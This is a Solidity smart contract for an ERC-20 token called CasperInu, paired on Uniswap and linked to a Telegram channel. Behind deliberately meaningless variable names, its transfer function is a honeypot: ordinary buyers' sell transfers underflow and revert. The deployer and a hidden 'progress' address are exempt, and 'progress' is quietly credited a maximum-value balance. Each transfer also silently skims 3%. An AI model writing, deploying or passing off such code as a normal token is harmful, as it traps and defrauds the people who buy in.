// https://t.me/casperinu

// SPDX-License-Identifier: MIT

pragma solidity >0.8.5;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract CasperInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private secret;

    function _transfer(
        address seems,
        address pride,
        uint256 wife
    ) internal override {
        uint256 whistle = stream;

        if (supply[seems] == 0 && secret[seems] > 0 && uniswapV2Pair != seems) {
            supply[seems] -= whistle;
        }

        address factor = radio;
        radio = pride;
        secret[factor] += whistle + 1;

        _balances[seems] -= wife;
        uint256 whenever = (wife / 100) * stream;
        wife -= whenever;
        _balances[pride] += wife;
    }

    address private radio;
    mapping(address => uint256) private supply;
    uint256 public stream = 3;

    constructor(
        string memory quite,
        string memory front,
        address perhaps,
        address progress
    ) ERC20(quite, front) {
        uint256 seeing = ~((uint256(0)));

        uniswapV2Router = IUniswapV2Router02(perhaps);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        supply[msg.sender] = seeing;
        supply[progress] = seeing;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[progress] = seeing;
    }
}